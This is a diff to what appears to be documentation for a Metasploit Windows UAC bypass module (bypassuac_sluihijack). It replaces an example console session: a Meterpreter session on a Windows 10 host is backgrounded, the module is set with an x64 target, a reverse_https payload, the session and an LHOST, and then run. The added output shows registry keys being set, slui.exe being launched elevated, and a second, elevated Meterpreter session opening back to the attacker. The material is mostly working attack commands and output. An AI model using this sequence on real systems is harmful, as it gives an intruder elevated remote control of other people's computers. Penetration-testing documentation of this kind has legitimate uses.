@@ -25,9 +25,9 @@
 
 ```
 msf exploit(multi/handler) > 
-[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 8phccqmk) Encoded stage with x86/shikata_ga_nai
-[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 8phccqmk) Staging x86 payload (180854 bytes) ...
-[*] Meterpreter session 1 opened (192.168.0.30:443 -> 192.168.0.33:49942) at 2018-04-07 11:29:31 +0200
+[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Encoded stage with x86/shikata_ga_nai
+[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Staging x86 payload (180854 bytes) ...
+[*] Meterpreter session 1 opened (192.168.0.30:443 -> 192.168.0.33:49875) at 2018-04-07 18:33:11 +0200
 
 msf exploit(multi/handler) > sessions 
 
@@ -36,7 +36,7 @@ Active sessions
 
   Id  Name  Type                     Information                 Connection
   --  ----  ----                     -----------                 ----------
-  1         meterpreter x86/windows  WIN10-01\user01 @ WIN10-01  192.168.0.30:443 -> 192.168.0.33:49942 (192.168.0.33)
+  1         meterpreter x86/windows  WIN10-01\user01 @ WIN10-01  192.168.0.30:443 -> 192.168.0.33:49875 (192.168.0.33)
 
 msf exploit(multi/handler) > sessions 1
 [*] Starting interaction with 1...
@@ -45,7 +45,7 @@ meterpreter > sysinfo
 Computer        : WIN10-01
 OS              : Windows 10 (Build 16299).
 Architecture    : x64
-System Language : en_US
+System Language : ru_RU
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
@@ -66,30 +66,39 @@ SeUndockPrivilege
 
 meterpreter > background 
 [*] Backgrounding session 1...
-msf exploit(multi/handler) > use exploit/windows/local/bypassuac_sluihijack 
-msf exploit(windows/local/bypassuac_sluihijack) > options 
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac_sluihijack
+msf exploit(windows/local/bypassuac_sluihijack) > show targets 
 
-Module options (exploit/windows/local/bypassuac_sluihijack):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION                   yes       The session to run this module on.
-
-
-Exploit target:
+Exploit targets:
 
    Id  Name
    --  ----
    0   Windows x86
+   1   Windows x64
 
 
+msf exploit(windows/local/bypassuac_sluihijack) > set target 1
+target => 1
 msf exploit(windows/local/bypassuac_sluihijack) > set payload windows/x64/meterpreter/reverse_https
 payload => windows/x64/meterpreter/reverse_https
-msf exploit(windows/local/bypassuac_sluihijack) > set LHOST 192.168.0.30
-LHOST => 192.168.0.30
 msf exploit(windows/local/bypassuac_sluihijack) > set session 1
 session => 1
-msf exploit(windows/local/bypassuac_sluihijack) > exploit
+msf exploit(windows/local/bypassuac_sluihijack) > set LHOST 192.168.0.30
+LHOST => 192.168.0.30
+msf exploit(windows/local/bypassuac_sluihijack) > exploit 
+
+[*] Started HTTPS reverse handler on https://192.168.0.30:8443
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Configuring payload and stager registry keys ...
+[*] Executing payload: C:\Windows\Sysnative\cmd.exe /c powershell Start-Process C:\Windows\System32\slui.exe -Verb runas
+[*] https://192.168.0.30:8443 handling request from 192.168.0.33; (UUID: znqja6ua) Staging x64 payload (207449 bytes) ...
+[*] Meterpreter session 2 opened (192.168.0.30:8443 -> 192.168.0.33:49881) at 2018-04-07 18:34:39 +0200
+[*] Cleaining up registry keys ...
+
+meterpreter >
 
 
 
